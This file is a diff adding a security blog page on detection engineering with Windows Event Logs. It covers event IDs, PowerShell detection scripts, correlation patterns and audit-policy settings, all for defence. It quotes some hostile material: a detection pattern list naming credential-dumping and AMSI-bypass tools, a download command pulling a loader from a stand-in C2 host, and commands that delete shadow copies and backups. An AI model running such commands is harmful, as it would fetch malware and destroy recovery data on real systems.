@@ -1,0 +1,436 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Windows Event Log Forensics: Building Detection Rules That Actually Work — WinSentinel Blog</title>
+  <meta name="description" content="Your SIEM is drowning in noise while attackers hide in plain sight. Here's how to build high-fidelity detection rules from Windows Event Logs that catch real threats — failed brute-force attempts, privilege escalation, Defender tampering, and suspicious PowerShell — without alert fatigue." />
+  <meta name="theme-color" content="#0b0f17" />
+  <meta name="author" content="Saurav Bhattacharya" />
+  <meta property="og:title" content="Windows Event Log Forensics: Building Detection Rules That Actually Work" />
+  <meta property="og:description" content="Your SIEM is drowning in noise while attackers hide in plain sight. Here's how to build high-fidelity detection rules from Windows Event Logs that catch real threats — failed brute-force attempts, privilege escalation, Defender tampering, and suspicious PowerShell — without alert fatigue." />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2026-06-07" />
+  <meta property="og:url" content="https://winsentinel.ai/blog/event-log-forensics" />
+  <meta property="og:image" content="https://winsentinel.ai/og/blog.png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="https://winsentinel.ai/og/blog.png" />
+  <meta name="twitter:title" content="Windows Event Log Forensics: Building Detection Rules That Actually Work" />
+  <meta name="twitter:description" content="Your SIEM is drowning in noise while attackers hide in plain sight. Here's how to build high-fidelity detection rules from Windows Event Logs that catch real threats — failed brute-force attempts, privilege escalation, Defender tampering, and suspicious PowerShell — without alert fatigue." />
+  <link rel="canonical" href="https://winsentinel.ai/blog/event-log-forensics" />
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cpath fill='%2338bdf8' d='M32 4 8 14v18c0 14 10 24 24 28 14-4 24-14 24-28V14L32 4Z'/%3E%3Cpath fill='%230b0f17' d='m28 38-7-7 3-3 4 4 11-11 3 3-14 14Z'/%3E%3C/svg%3E" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            mono: ['ui-monospace','SFMono-Regular','Menlo','Monaco','Consolas','monospace'],
+            sans: ['Inter','ui-sans-serif','system-ui','-apple-system','Segoe UI','Roboto','sans-serif'],
+          },
+          colors: {
+            ink: { 950: '#070a11', 900: '#0b0f17', 800: '#11161f', 700: '#1a2030' },
+          },
+        },
+      },
+    };
+  </script>
+  <style>
+    html { scroll-behavior: smooth; }
+    body { background: radial-gradient(1200px 600px at 50% -200px, #0e1a2d 0%, #070a11 60%, #070a11 100%); }
+    .prose h2 { color: #fff; font-size: 1.5rem; font-weight: 700; margin-top: 2rem; margin-bottom: 0.75rem; }
+    .prose h3 { color: #e2e8f0; font-size: 1.125rem; font-weight: 600; margin-top: 1.5rem; margin-bottom: 0.5rem; }
+    .prose p { color: #cbd5e1; line-height: 1.75; margin-bottom: 1rem; }
+    .prose code { color: #7dd3fc; background: rgba(56,189,248,.08); padding: 2px 6px; border-radius: 4px; font-size: 0.875em; }
+    .prose pre { background: #11161f; border: 1px solid rgba(255,255,255,.08); border-radius: 8px; padding: 1rem; overflow-x: auto; margin: 1rem 0; }
+    .prose pre code { background: none; padding: 0; color: #e2e8f0; }
+    .prose ul { list-style: disc; padding-left: 1.5rem; color: #cbd5e1; margin-bottom: 1rem; }
+    .prose li { margin-bottom: 0.25rem; }
+    .prose a { color: #38bdf8; text-decoration: underline; text-underline-offset: 2px; }
+    .prose a:hover { color: #7dd3fc; }
+    .prose blockquote { border-left: 3px solid #38bdf8; padding-left: 1rem; color: #94a3b8; font-style: italic; margin: 1rem 0; }
+  </style>
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "@id": "https://winsentinel.ai/blog/event-log-forensics",
+  "headline": "Windows Event Log Forensics: Building Detection Rules That Actually Work",
+  "datePublished": "2026-06-07",
+  "dateModified": "2026-06-07",
+  "url": "https://winsentinel.ai/blog/event-log-forensics",
+  "mainEntityOfPage": "https://winsentinel.ai/blog/event-log-forensics",
+  "description": "Your SIEM is drowning in noise while attackers hide in plain sight. Here's how to build high-fidelity detection rules from Windows Event Logs that catch real threats — failed brute-force attempts, privilege escalation, Defender tampering, and suspicious PowerShell — without alert fatigue.",
+  "author": {
+    "@type": "Person",
+    "name": "Saurav Bhattacharya"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "WinSentinel",
+    "url": "https://winsentinel.ai",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://winsentinel.ai/og/default.svg"
+    }
+  },
+  "image": "https://winsentinel.ai/og/blog.png",
+  "isPartOf": {
+    "@type": "Blog",
+    "@id": "https://winsentinel.ai/blog",
+    "name": "WinSentinel Blog"
+  }
+}
+  </script>
+</head>
+<body class="font-sans text-slate-200 antialiased">
+
+<div id="site-header"></div>
+
+<article class="max-w-3xl mx-auto px-6 pt-14 pb-20">
+  <a href="/blog" class="text-sm text-sky-400 hover:text-sky-300">← All posts</a>
+  <time class="mt-8 block text-xs text-slate-500 uppercase tracking-wider">June 7, 2026</time>
+  <h1 class="mt-2 text-3xl md:text-4xl font-bold text-white leading-tight">Windows Event Log Forensics: Building Detection Rules That Actually Work</h1>
+  <p class="mt-4 text-lg text-slate-300">Your SIEM is drowning in noise while attackers hide in plain sight. Here's how to build high-fidelity detection rules from Windows Event Logs that catch real threats — failed brute-force attempts, privilege escalation, Defender tampering, and suspicious PowerShell — without alert fatigue.</p>
+
+  <div class="prose mt-8">
+    <div class="prose mt-6">
+        <p>Windows Event Logs are simultaneously the most valuable and most underutilized forensic data source on any enterprise endpoint. They record every authentication attempt, every service installation, every policy change, every process creation — a complete audit trail that most organizations barely scratch the surface of. The problem isn't data availability. The problem is signal-to-noise ratio.</p>
+
+        <p>A single Windows workstation generates between 5,000 and 50,000 events per day depending on activity level. A domain controller can generate 500,000+. At that volume, naive "forward everything to the SIEM" strategies create a firehose that buries critical alerts under mountains of benign noise. Detection engineering for Windows Event Logs requires understanding <em>which</em> events matter, <em>why</em> they matter, and <em>when</em> their context transforms them from routine to malicious.</p>
+
+        <p>This post covers the detection engineering approach built into WinSentinel's Event Log Analysis module — the specific event IDs, correlation patterns, and threshold logic that separate signal from noise.</p>
+
+        <h2>The High-Value Event IDs Every Defender Must Monitor</h2>
+
+        <p>Of the hundreds of event types Windows generates, a relatively small set provides outsized forensic value. These are the events that, when properly correlated, expose attack chains from initial access through lateral movement to data exfiltration.</p>
+
+        <h3>Authentication Events (Security Log)</h3>
+
+        <p>Authentication is where most attacks become visible — either through brute-force patterns, credential stuffing, or lateral movement using compromised credentials.</p>
+
+        <ul>
+          <li><strong>Event ID 4625</strong> — Failed logon attempt. The single most important event for detecting brute-force attacks. Key fields: <code>TargetUserName</code>, <code>LogonType</code>, <code>IpAddress</code>, <code>SubStatus</code> (explains <em>why</em> it failed: wrong password, account locked, expired, disabled).</li>
+          <li><strong>Event ID 4624</strong> — Successful logon. Especially critical after a series of 4625s (successful brute-force). <code>LogonType=10</code> (RemoteInteractive/RDP) from unexpected IPs is a top-tier indicator. <code>LogonType=3</code> (Network) from workstation-to-workstation indicates lateral movement.</li>
+          <li><strong>Event ID 4648</strong> — Explicit credential logon. Someone used <code>runas</code> or passed credentials explicitly. Common in lateral movement when attackers use harvested credentials.</li>
+          <li><strong>Event ID 4776</strong> — NTLM credential validation. Critical for detecting pass-the-hash attacks where Kerberos isn't used.</li>
+        </ul>
+
+        <pre><code># Detection rule: Brute-force pattern
+# 10+ failed logons (4625) to same account within 5 minutes,
+# followed by successful logon (4624)
+
+$timeWindow = 5  # minutes
+$threshold = 10
+
+$failed = Get-WinEvent -FilterHashtable @{
+    LogName = 'Security'; Id = 4625
+    StartTime = (Get-Date).AddMinutes(-$timeWindow)
+} | Group-Object { $_.Properties[5].Value }  # TargetUserName
+
+$bruteForced = $failed | Where-Object { $_.Count -ge $threshold }
+foreach ($target in $bruteForced) {
+    $success = Get-WinEvent -FilterHashtable @{
+        LogName = 'Security'; Id = 4624
+        StartTime = (Get-Date).AddMinutes(-$timeWindow)
+    } | Where-Object { $_.Properties[5].Value -eq $target.Name }
+    if ($success) {
+        # ALERT: Successful brute-force detected
+        Write-Warning "Account '$($target.Name)' compromised via brute-force ($($target.Count) failed attempts → success)"
+    }
+}</code></pre>
+
+        <h3>Privilege Escalation Events</h3>
+
+        <p>Once an attacker has a foothold, they escalate. These events reveal the moment local admin or SYSTEM privileges are obtained:</p>
+
+        <ul>
+          <li><strong>Event ID 4672</strong> — Special privileges assigned to a new logon. Fires when an account with admin-equivalent privileges (SeDebugPrivilege, SeTcbPrivilege, SeBackupPrivilege, etc.) logs on. If this fires for a non-admin account, you have a problem.</li>
+          <li><strong>Event ID 4728/4732/4756</strong> — Member added to a global/local/universal security group. Specifically watch for additions to <code>Administrators</code>, <code>Domain Admins</code>, <code>Enterprise Admins</code>, <code>Schema Admins</code>, and <code>Backup Operators</code>.</li>
+          <li><strong>Event ID 4697</strong> — Service installed. Malware frequently installs itself as a service to achieve SYSTEM privileges and persistence. Services spawned from temp directories or with encoded command-line arguments are almost always malicious.</li>
+          <li><strong>Event ID 4688</strong> — New process created (requires <em>Audit Process Creation</em> + <em>Include command line in process creation events</em>). The gold standard for detecting post-exploitation activity.</li>
+        </ul>
+
+        <pre><code># Detection rule: Suspicious service installation
+# New service + unusual binary path = persistence mechanism
+
+$suspiciousPaths = @('\Temp\', '\AppData\', '\Downloads\', '\ProgramData\\.', 'cmd.exe /c', 'powershell')
+
+Get-WinEvent -FilterHashtable @{ LogName='System'; Id=7045 } -MaxEvents 50 | ForEach-Object {
+    $serviceName = $_.Properties[0].Value
+    $imagePath = $_.Properties[1].Value
+    foreach ($pattern in $suspiciousPaths) {
+        if ($imagePath -match [regex]::Escape($pattern)) {
+            Write-Warning "Suspicious service: '$serviceName' → $imagePath"
+            break
+        }
+    }
+}</code></pre>
+
+        <h3>Defense Evasion: Defender and Security Tool Tampering</h3>
+
+        <p>Sophisticated attackers don't just exploit — they disable defenses. These events reveal when security controls are being neutralized:</p>
+
+        <ul>
+          <li><strong>Event ID 5001</strong> (Windows Defender) — Real-time protection disabled. If this wasn't triggered by an admin during maintenance, it's an attacker clearing the path.</li>
+          <li><strong>Event ID 5010/5012</strong> — Malware scanning disabled / Defender service suspended. Same logic: unexpected disablement = compromise.</li>
+          <li><strong>Event ID 1102</strong> (Security Log) — Audit log cleared. <strong>This is always suspicious.</strong> Legitimate administrators almost never clear the Security log. Attackers clear it to destroy evidence of their 4625/4624/4672/4688 events.</li>
+          <li><strong>Event ID 4719</strong> — System audit policy changed. Attackers may disable audit policies to stop future events from being generated. If Process Creation auditing is suddenly disabled, the attacker is covering tracks for the next phase.</li>
+        </ul>
+
+        <pre><code># Detection rule: Defender tamper detection
+# Any Defender disable event outside a maintenance window = critical alert
+
+$defenderEvents = @(5001, 5010, 5012, 5013, 5101)
+$maintenanceHours = @(2, 3, 4)  # 2-4 AM = acceptable maintenance window
+
+$tampering = Get-WinEvent -FilterHashtable @{
+    LogName = 'Microsoft-Windows-Windows Defender/Operational'
+    Id = $defenderEvents
+    StartTime = (Get-Date).AddHours(-24)
+} -ErrorAction SilentlyContinue
+
+foreach ($evt in $tampering) {
+    $hour = $evt.TimeCreated.Hour
+    if ($hour -notin $maintenanceHours) {
+        Write-Warning "CRITICAL: Defender tampering at $($evt.TimeCreated) — Event $($evt.Id): $($evt.Message -split "`n" | Select-Object -First 1)"
+    }
+}</code></pre>
+
+        <h3>PowerShell Security Events</h3>
+
+        <p>PowerShell is the #1 post-exploitation tool. Module logging and Script Block logging expose exactly what's being executed — even through obfuscation layers:</p>
+
+        <ul>
+          <li><strong>Event ID 4103</strong> (PowerShell Operational) — Module logging. Records every cmdlet invocation with parameters. Catches <code>Invoke-Mimikatz</code>, <code>Invoke-WebRequest</code> to suspicious URLs, <code>Get-ADUser</code> enumeration, etc.</li>
+          <li><strong>Event ID 4104</strong> — Script Block logging. <strong>The most powerful single detection event.</strong> Records the full script text <em>after</em> deobfuscation. Even if the attacker encodes their script in Base64 and wraps it in three layers of <code>Invoke-Expression</code>, 4104 records the final decoded text that actually executes.</li>
+          <li><strong>Event ID 400/403</strong> (Windows PowerShell) — Engine lifecycle. <code>HostApplication</code> field reveals what launched PowerShell. If <code>HostApplication</code> is <code>cmd.exe</code> with an encoded command, that's suspicious.</li>
+        </ul>
+
+        <pre><code># Detection rule: Suspicious PowerShell patterns in Script Block logs
+# These patterns indicate offensive tooling, not admin scripts
+
+$maliciousPatterns = @(
+    'Invoke-Mimikatz',              # Credential dumping
+    'Invoke-Kerberoast',            # Kerberos ticket extraction
+    'Get-GPPPassword',              # Group Policy Preference passwords
+    'Invoke-SMBExec',               # Lateral movement
+    'Invoke-WMIExec',               # Lateral movement
+    'New-Object.*Net.WebClient',    # Download cradle
+    'System.Reflection.Assembly',   # In-memory .NET assembly load
+    'VirtualAlloc.*VirtualProtect', # Shellcode injection pattern
+    '-bxor|-band.*0x',              # XOR decryption (obfuscation)
+    'AMSI.*Bypass',                 # Anti-malware bypass attempt
+    'Set-MpPreference.*-Disable'    # Defender disable via PowerShell
+)
+
+Get-WinEvent -FilterHashtable @{
+    LogName = 'Microsoft-Windows-PowerShell/Operational'; Id = 4104
+    StartTime = (Get-Date).AddHours(-1)
+} -ErrorAction SilentlyContinue | ForEach-Object {
+    $scriptBlock = $_.Properties[2].Value
+    foreach ($pattern in $maliciousPatterns) {
+        if ($scriptBlock -match $pattern) {
+            Write-Warning "Malicious PowerShell detected: pattern '$pattern' at $($_.TimeCreated)"
+            Write-Warning "Script: $($scriptBlock.Substring(0, [Math]::Min(200, $scriptBlock.Length)))..."
+            break
+        }
+    }
+}</code></pre>
+
+        <h2>Correlation: From Individual Events to Attack Chains</h2>
+
+        <p>Individual events are informative. Correlated events are actionable. The real power of event log forensics lies in linking related events across time windows to reconstruct complete attack chains.</p>
+
+        <h3>Pattern: Brute Force → Logon → Privilege Escalation</h3>
+
+        <p>The classic credential compromise chain:</p>
+        <ol>
+          <li><code>4625 × N</code> — Multiple failed logons to one account (brute force)</li>
+          <li><code>4624 (LogonType=10)</code> — RDP logon succeeds with same account</li>
+          <li><code>4672</code> — Privileged logon (attacker got admin)</li>
+          <li><code>4688</code> — Process creation showing reconnaissance (<code>whoami</code>, <code>net user</code>, <code>ipconfig</code>)</li>
+          <li><code>4697/7045</code> — Service installation (persistence)</li>
+        </ol>
+
+        <p>Each individual event is weak. A failed logon happens thousands of times a day. But the <em>sequence</em> — 4625→4624→4672→4688→4697 within a 30-minute window against the same account — is nearly 100% confidence of compromise.</p>
+
+        <h3>Pattern: Defense Disable → Payload Drop → Persistence</h3>
+
+        <ol>
+          <li><code>5001</code> — Defender real-time protection disabled</li>
+          <li><code>4104</code> — PowerShell downloads executable (<code>Invoke-WebRequest</code>)</li>
+          <li><code>4688</code> — New process from Temp directory</li>
+          <li><code>7045</code> — Service installed pointing to dropped binary</li>
+          <li><code>4719</code> — Audit policy modified (covering tracks)</li>
+        </ol>
+
+        <h3>Pattern: Lateral Movement via WMI/PsExec</h3>
+
+        <ol>
+          <li><code>4624 (LogonType=3)</code> — Network logon from internal IP (not a server)</li>
+          <li><code>4672</code> — Admin privileges on the target</li>
+          <li><code>4688</code> — <code>wmiprvse.exe</code> spawning <code>cmd.exe</code> or <code>powershell.exe</code></li>
+          <li><code>7045</code> — PSEXESVC service installed (PsExec artifact)</li>
+        </ol>
+
+        <p>WinSentinel's Event Log Analysis correlates these patterns in real-time across Security, System, PowerShell, and Defender operational logs — building the complete picture that individual event monitoring misses.</p>
+
+        <h2>Thresholding: Eliminating False Positives Without Missing Attacks</h2>
+
+        <p>The difference between a useful detection rule and an alert-fatigue generator is thresholding. Raw event monitoring produces too many false positives to be actionable. Effective detection requires understanding normal baselines and setting thresholds that minimize noise while preserving detection fidelity.</p>
+
+        <h3>Failed Logon Thresholds</h3>
+
+        <p>A single 4625 event is meaningless — users mistype passwords constantly. But the threshold depends on context:</p>
+
+        <ul>
+          <li><strong>Interactive workstation:</strong> 5+ failures in 5 minutes is suspicious (user would reset or call help desk)</li>
+          <li><strong>Service accounts:</strong> ANY 4625 is suspicious (service accounts don't mistype passwords)</li>
+          <li><strong>Domain admin accounts:</strong> 3+ failures in 10 minutes warrants investigation</li>
+          <li><strong>After-hours failures:</strong> Lower threshold (3+) since legitimate users are unlikely to be active</li>
+        </ul>
+
+        <h3>Process Creation Baselines</h3>
+
+        <p>Event 4688 fires for every process. The key is filtering to suspicious patterns:</p>
+
+        <ul>
+          <li>Process image path in unusual locations (Temp, AppData, Recycle Bin)</li>
+          <li>Encoded command-line arguments (<code>-enc</code>, <code>-e</code>, <code>-EncodedCommand</code> for PowerShell)</li>
+          <li>Multiple reconnaissance tools in sequence (<code>whoami</code> → <code>net user</code> → <code>net group</code> → <code>ipconfig /all</code> within 60 seconds)</li>
+          <li>Process creation at unusual times (3 AM on a workstation that's normally idle)</li>
+        </ul>
+
+        <h3>WinSentinel's Approach</h3>
+
+        <p>Rather than static thresholds, WinSentinel's Event Log Analysis uses adaptive detection:</p>
+
+        <ul>
+          <li><strong>Sliding window analysis</strong> — examines patterns within configurable time windows (default 5/15/60 minutes)</li>
+          <li><strong>Account type awareness</strong> — applies different thresholds to service accounts vs. interactive users vs. admin accounts</li>
+          <li><strong>Time-of-day weighting</strong> — events during business hours receive lower urgency than identical events at 3 AM</li>
+          <li><strong>Correlation scoring</strong> — individual weak signals combine into strong indicators when they form known attack chain patterns</li>
+        </ul>
+
+        <h2>Enabling the Right Audit Policies</h2>
+
+        <p>None of this works if the events aren't being generated. Windows doesn't enable comprehensive auditing by default. Here's the minimum audit policy configuration for effective detection:</p>
+
+        <pre><code># Essential audit policies for detection engineering:
+auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
+auditpol /set /category:"Account Logon" /success:enable /failure:enable
+auditpol /set /subcategory:"Process Creation" /success:enable
+auditpol /set /subcategory:"Security Group Management" /success:enable
+auditpol /set /subcategory:"Audit Policy Change" /success:enable
+auditpol /set /subcategory:"Security System Extension" /success:enable
+
+# Enable command-line in process creation events (critical!):
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
+
+# Enable PowerShell Script Block logging:
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f
+
+# Enable PowerShell Module logging:
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames" /v * /t REG_SZ /d * /f</code></pre>
+
+        <p>WinSentinel's Event Log Analysis module checks whether these policies are active. If they're not enabled, the module reports it as a finding — because you can't detect what you're not logging.</p>
+
+        <h2>Real-World Scenario: Detecting a Ransomware Precursor</h2>
+
+        <p>Here's how event log correlation catches a ransomware attack in its preparation phase — before encryption begins:</p>
+
+        <p><strong>Hour 0:</strong> Attacker sends phishing email with malicious Excel attachment.</p>
+        <ul>
+          <li>Event 4688: <code>EXCEL.EXE</code> spawns <code>cmd.exe</code> (caught by Process Lineage)</li>
+          <li>Event 4104: PowerShell Script Block shows <code>Invoke-WebRequest -Uri http://c2.evil/loader.exe</code></li>
+        </ul>
+
+        <p><strong>Hour 1:</strong> Attacker establishes persistence and begins reconnaissance.</p>
+        <ul>
+          <li>Event 7045: New service <code>WinUpdateSvc</code> installed from <code>C:\Users\Public\svc.exe</code></li>
+          <li>Event 4688: Rapid sequence of <code>whoami</code>, <code>net user /domain</code>, <code>net group "domain admins"</code>, <code>nltest /dclist:</code></li>
+        </ul>
+
+        <p><strong>Hour 2:</strong> Attacker disables defenses and moves laterally.</p>
+        <ul>
+          <li>Event 5001: Defender real-time protection disabled</li>
+          <li>Event 4624 (Type 3): Network logons to 12 workstations from compromised account</li>
+          <li>Event 4672: Admin privilege assertion on each target</li>
+        </ul>
+
+        <p><strong>Hour 3:</strong> Ransomware preparation (this is where you must catch it).</p>
+        <ul>
+          <li>Event 4688: <code>vssadmin.exe delete shadows /all /quiet</code> — deleting Volume Shadow Copies</li>
+          <li>Event 4688: <code>wbadmin.exe delete catalog -quiet</code> — deleting backup catalog</li>
+          <li>Event 4688: <code>bcdedit.exe /set {default} recoveryenabled no</code> — disabling Windows Recovery</li>
+        </ul>
+
+        <p>WinSentinel flags all of these as they occur. The combination of Defender disable + VSS deletion + backup deletion is a <strong>critical</strong> finding that maps to ransomware precursor activity (MITRE T1490: Inhibit System Recovery). By the time you see this sequence, you have minutes — not hours — to respond.</p>
+
+        <h2>From Analysis to Action: The Detection Engineering Lifecycle</h2>
+
+        <p>Building effective event log detections isn't a one-time setup. It's an iterative engineering process:</p>
+
+        <ol>
+          <li><strong>Hypothesis</strong> — "Attackers using WMI for lateral movement will generate 4624→4672→wmiprvse→cmd events"</li>
+          <li><strong>Validate</strong> — Test the hypothesis with attack simulation (Atomic Red Team, manual testing)</li>
+          <li><strong>Threshold</strong> — Determine what separates malicious patterns from legitimate admin activity</li>
+          <li><strong>Deploy</strong> — Implement the detection rule with appropriate alerting</li>
+          <li><strong>Tune</strong> — Monitor false positives, adjust thresholds, add exclusions for known-good activity</li>
+          <li><strong>Evolve</strong> — Update as attackers change TTPs (Tactics, Techniques, and Procedures)</li>
+        </ol>
+
+        <p>WinSentinel automates steps 1-4 for the most common attack patterns. The module ships with pre-built detection logic for 15+ event correlation patterns, each validated against real-world attack data and mapped to MITRE ATT&CK.</p>
+
+        <h2>Scaling Event Log Analysis Across a Fleet</h2>
+
+        <p>Event log analysis on a single machine is powerful. Across a fleet, it becomes transformative. Attack patterns that are invisible on one endpoint become obvious when correlated across many:</p>
+
+        <ul>
+          <li><strong>Password spray detection</strong> — 1 failed logon per machine is noise. The same account failing across 50 machines in 10 minutes is a spray attack. Only fleet-wide correlation catches this.</li>
+          <li><strong>Lateral movement visualization</strong> — mapping 4624 (Type 3) events across the fleet reveals the attacker's path through the network as a graph.</li>
+          <li><strong>Defender tampering patterns</strong> — if Defender is disabled on 3 machines within an hour, that's coordinated activity — not three unrelated admin actions.</li>
+          <li><strong>Baseline deviation</strong> — understanding what's "normal" for each machine class (workstation vs. server vs. DC) enables anomaly detection that per-machine analysis can't achieve.</li>
+        </ul>
+
+        <blockquote>
+          <p><strong>WinSentinel Pro</strong> brings fleet-wide event log correlation. Each agent runs the Event Log Analysis module locally, then reports findings to the central control plane where cross-node patterns are identified. Password sprays, coordinated Defender disablement, and lateral movement paths that are invisible to individual endpoints become immediately visible at fleet scale.</p>
+        </blockquote>
+
+        <h2>Getting Started</h2>
+
+        <p>Run WinSentinel's Event Log Analysis right now to see what your logs reveal:</p>
+
+        <pre><code># Install WinSentinel
+dotnet tool install --global WinSentinel.Cli
+
+# Run a full audit (includes Event Log Analysis)
+winsentinel --audit
+
+# Or run just the Event Log module
+winsentinel --audit --modules "Event Log Analysis"</code></pre>
+
+        <p>The module will check your audit policy configuration, scan recent events for suspicious patterns, and report any detection rule hits — from brute-force attempts to Defender tampering to suspicious service installations. Every finding includes the specific event IDs, timestamps, and MITRE ATT&CK mappings you need to investigate.</p>
+
+        <p>Stop forwarding raw events to a SIEM and hoping someone notices. Start detecting with precision.</p>
+      </div>
+
+      <a href="#" class="inline-block mt-6 text-sm text-sky-400 hover:text-sky-300">← Back to top</a>
+    
+  </div>
+
+  <nav class="mt-16 pt-8 border-t border-white/10 flex items-center justify-between gap-6 text-sm text-slate-400">
+    <a href="/blog/kill-chain-analysis" class="hover:text-white">← Kill Chain Analysis: Turning Isolated Security Findings into Attack Narratives</a>
+    <a href="/blog/process-lineage-analysis" class="hover:text-white text-right">Process Lineage Analysis: Catching LOLBin Abuse and Living-off-the-Land Attacks →</a>
+  </nav>
+</article>
+
+<div id="site-footer"></div>
+<script src="/components/nav.js"></script>
+</body>
+</html>
